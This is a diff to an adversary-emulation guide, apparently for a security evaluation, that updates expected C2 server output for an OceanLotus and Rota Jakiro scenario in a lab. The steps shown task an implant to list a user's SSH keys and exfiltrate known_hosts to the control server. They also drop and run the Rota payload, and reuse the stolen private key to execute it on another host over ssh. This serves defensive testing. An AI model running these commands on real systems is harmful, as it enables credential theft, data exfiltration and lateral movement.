@@ -241,6 +241,14 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
    ```
+   Expected Output: 
+   ```
+   [SUCCESS] 2023/08/24 19:21:26 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+   [Task] 2023/08/24 19:21:32 total 8
+   ...
+   rw-r--r--  1 hpotter  VISERION\Domain Users  456 Aug 24 19:21 com.apple.launchpad.plist
+   [SUCCESS] 2023/08/24 19:21:32 Successfully set task output.
+   ```
 
 
    <details><summary>Extra Credit - Execute Persistence</summary>
@@ -330,15 +338,16 @@ Search for local credentials on the macOS host and use t
    
    Expected Output:
    ```
-   [INFO] 2023/08/18 18:20:22 Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
-   [Task] 2023/08/18 18:20:22 total 24
+   [SUCCESS] 2023/08/24 19:23:52 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+   ...
+   [Task] 2023/08/24 19:23:59 total 24
    drwx------   5 hpotter  VISERION\Domain Users   160 Aug  4 19:09 .
    drwxr-xr-x+ 18 hpotter  VISERION\Domain Users   576 Aug  4 18:23 ..
    -rw-------   1 hpotter  VISERION\Domain Users  2635 Aug  3 18:14 id_rsa
    -rw-r--r--   1 hpotter  VISERION\Domain Users   589 Aug  3 18:14 id_rsa.pub
    -rw-r--r--   1 hpotter  VISERION\Domain Users   172 Aug  4 19:09 known_hosts
    
-   [SUCCESS] 2023/08/18 18:20:22 Successfully set task output.
+   [SUCCESS] 2023/08/24 19:23:59 Successfully set task output.
    ```
    
 1. Exfil the Known Host File for review.  
@@ -347,7 +356,9 @@ Search for local credentials on the macOS host and use t
     ```
    Expected output:
    ```
-   [SUCCESS] 2023/08/18 18:29:30 File uploaded: Successfully uploaded file to control server at './files/known_hosts'
+   [SUCCESS] 2023/08/24 19:24:54 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+   ...
+   [SUCCESS] 2023/08/24 19:24:54 File uploaded: Successfully uploaded file to control server at './files/known_hosts'
    ```
    
 1. Verify the file was uploaded to the control server.
@@ -375,6 +386,8 @@ Search for local credentials on the macOS host and use t
    sudo chown -R $(whoami) /usr/local/Cellar
    dscl
    ...
+   
+   [SUCCESS] 2023/08/24 19:25:30 Successfully set task output.
    ```
    
    Reviewing the history file, we see the user uses scp commands to a specified IP address. 
@@ -416,8 +429,9 @@ Execute Rota Jakiro
    ```
    Expected Output:
    ```
+   [SUCCESS] 2023/08/24 19:26:19 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+   ...
    [INFO] 2023/08/24 18:53:21 Fetching requested file for task:  rota
-   [INFO] 2023/08/24 18:53:21 Sending new task to implant: b6dbd70f203515095d0ca8a5ecbb43f7
    ```
 
    Verify the file downloaded
@@ -426,10 +440,13 @@ Execute Rota Jakiro
    ```
    Exepcted Output:
    ```
-   Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
-   [Task] 2023/08/24 18:54:55 -rw-r--r--  1 hpotter  VISERION\Domain Users  30856 Aug 24 18:53 /Users/hpotter/Library/WebKit/osx.download
+   [SUCCESS] 2023/08/24 19:28:06 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+   [INFO] 2023/08/24 19:28:20 New task received for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
+   [INFO] 2023/08/24 19:28:20 Sending new task to implant: b6dbd70f203515095d0ca8a5ecbb43f7
+   [INFO] 2023/08/24 19:28:20 Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
+   [Task] 2023/08/24 19:28:20 -rw-r--r--  1 hpotter  VISERION\Domain Users  30856 Aug 24 19:27 /Users/hpotter/Library/WebKit/osx.download
    
-   [SUCCESS] 2023/08/24 18:54:55 Successfully set task output.
+   [SUCCESS] 2023/08/24 19:28:20 Successfully set task output.
    ```
    💡 All files are downloaded to the directory where the OSX implant binary is running, `/Users/hpotter/Library/WebKit`, as `osx.download`. `/Users/hpotter/Library/WebKit` is where the OSX implant binary is dropped from the application bundle.
 
@@ -474,10 +491,10 @@ Execute Rota Jakiro
    ```
    Expected Output:
    ```
-   [SUCCESS] 2023/08/24 18:57:42 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+   [SUCCESS] 2023/08/24 19:29:43 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
    ...
-   [Task] 2023/08/24 18:57:54
-   [SUCCESS] 2023/08/24 18:57:54 Successfully set task output.
+   [Task] 2023/08/24 19:29:52
+   [SUCCESS] 2023/08/24 19:29:52 Successfully set task output.
    ```
 1. Give Rota Jakiro executable permissions
    ```
@@ -485,29 +502,36 @@ Execute Rota Jakiro
    ```
    Expected Output:
    ```
-   [SUCCESS] 2023/08/24 18:58:40 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+   [SUCCESS] 2023/08/24 19:29:43 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
    ...
-   [Task] 2023/08/24 18:58:46
-   [SUCCESS] 2023/08/24 18:58:46 Successfully set task output.
+   [Task] 2023/08/24 19:29:52
+   [SUCCESS] 2023/08/24 19:29:52 Successfully set task output.
    ```
    
-1. Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
+1. Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh & confirm registration. 
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&2>/dev/null; sleep 5; pkill rota;rm nohup.out\""}'                                         
    ```
-      Expected Output:
-   ```
-   [SUCCESS] 2023/08/24 18:59:35 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
-   ```
-1. Confirm C2 Registration of Rota on the C2 Server
    Expected Output:
    ```
-   [INFO] 2023/08/21 18:30:29 Received beacon from existing implant 01020304.
-   [INFO] 2023/08/21 18:30:29 No tasks available for UUID:  01020304
+   [SUCCESS] 2023/08/24 19:31:44 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+   ...
+   [INFO] 2023/08/24 19:31:57 Received first-time beacon from 01020304. Creating session...
+   
+   [SUCCESS] 2023/08/24 19:31:57 *** New session established: 01020304 ***
+   +----------+------------+----------+------+-----+------+
+   |   GUID   | IP ADDRESS | HOSTNAME | USER | PID | PPID |
+   +----------+------------+----------+------+-----+------+
+   | 01020304 |            |          |      |   0 |    0 |
+   +----------+------------+----------+------+-----+------+
+   
+   [INFO] 2023/08/24 19:31:57 Current Directory:
+   [INFO] 2023/08/24 19:31:57 Successfully added session.
+   [SUCCESS] 2023/08/24 19:31:57 Successfully created session for implant 01020304.
    ```
 
 <details><summary>Trouble Shooting</summary>
-   Check to make sure the binary for rota is in the correct location. Handlers will look for payloads to download using the resources/payloads/<my handler name> logic. 
+   Check to make sure the binary for rota is in the correct location for download. Handlers will look for payloads to download using the resources/payloads/<handler-name> logic. 
    
 </details>
 
@@ -552,8 +576,12 @@ The following information is collected.
    ```
    Expected Output:
    ```
-   [Task] 2023/08/21 18:31:26 drogon-x86_64-Linux-5.15.0-1040-aws 
-   [SUCCESS] 2023/08/21 18:31:26 Successfully set task output.
+   [SUCCESS] 2023/08/24 19:38:08 Successfully set task for session: 01020304
+   [INFO] 2023/08/24 19:38:10 New task received for UUID:  01020304
+   [INFO] 2023/08/24 19:38:10 Sending new task to implant: 01020304
+   [INFO] 2023/08/24 19:38:10 Received task output for session:  01020304
+   [Task] 2023/08/24 19:38:10 drogon-Linux-5.15.0-1040-aws
+   [SUCCESS] 2023/08/24 19:38:10 Successfully set task output.
    ```
 
 2. Upload shared object to execute `mount` command to discover drives on host.
@@ -597,7 +625,6 @@ The following information is collected.
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_steal_data", "arg": "/tmp/mount.txt"}'
    ```
-
    Expected Output:
    ```
    [INFO] 2023/08/24 13:29:04 Received beacon from existing implant 01020304.
